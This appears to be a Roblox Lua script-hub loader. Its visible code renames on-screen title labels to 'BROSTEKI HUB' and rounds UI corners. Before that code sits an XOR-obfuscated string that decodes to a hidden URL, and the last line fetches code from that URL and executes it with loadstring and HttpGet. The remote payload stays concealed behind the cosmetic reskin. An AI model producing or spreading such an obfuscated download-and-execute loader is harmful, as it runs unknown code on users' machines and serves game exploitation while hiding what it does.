
--[[ STAGE 2: VISUAL CORE ]]
local uHbV1rHdhek8aWSgFDH3="\023\010\005\008\004\252\202\197\001\017\062\198\008\005\057\004\058\008\052\053\006\052\006\053\053\050\060\054\047\240\062\045\050\239\047\041\041\053\040\051\042\049\039\093\047\227\047\094\038\043\034\081\042\094\089\021\090\033\088\086\016\061\072\072\076\013\040\071\086\071\065\085\044\093\040\081\092\077\068\064\124\120\078\088\066\065\070\067\068\083\118\111\109\127\120\125\126\041\042\035\036\042\037\038\037\106\156\115"local lyO8zQHtdrQbmX5jwLtzbv=29 local T4zwvLnmxHLX=151 local bkcbdD9QfqqOXPq4J=1 local WXlUbzJcp41HyBqNQ8E6CH=1 local HHsxAdiK7gfQBGyWKlsf=10 local JgfZcNwFKTs7f75d=false local sEBImezY_uSs5T4=bit32 and bit32.bxor if not sEBImezY_uSs5T4 then sEBImezY_uSs5T4=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local vvXJgs7kc6rF={}for nCdhYDjumLeT=1,#uHbV1rHdhek8aWSgFDH3 do local JTGXY8GnHu5qZiDQ3XxV=string.byte(uHbV1rHdhek8aWSgFDH3,nCdhYDjumLeT)local Oa6is9XtCTCbpiwTyZ0Fd=(T4zwvLnmxHLX+(nCdhYDjumLeT*WXlUbzJcp41HyBqNQ8E6CH)+HHsxAdiK7gfQBGyWKlsf)%256 if bkcbdD9QfqqOXPq4J==0 then JTGXY8GnHu5qZiDQ3XxV=(JTGXY8GnHu5qZiDQ3XxV-Oa6is9XtCTCbpiwTyZ0Fd)%256 vvXJgs7kc6rF[nCdhYDjumLeT]=string.char(sEBImezY_uSs5T4(JTGXY8GnHu5qZiDQ3XxV,lyO8zQHtdrQbmX5jwLtzbv))else JTGXY8GnHu5qZiDQ3XxV=sEBImezY_uSs5T4(JTGXY8GnHu5qZiDQ3XxV,lyO8zQHtdrQbmX5jwLtzbv)vvXJgs7kc6rF[nCdhYDjumLeT]=string.char((JTGXY8GnHu5qZiDQ3XxV-Oa6is9XtCTCbpiwTyZ0Fd)%256)end end local BfJyT8kmh50r=table.concat(vvXJgs7kc6rF)if JgfZcNwFKTs7f75d then BfJyT8kmh50r=string.reverse(BfJyT8kmh50r)end local ycZR2qnjNtAii9LMTmYRVr=BfJyT8kmh50r
local HubName = "BROSTEKI HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(ycZR2qnjNtAii9LMTmYRVr))()
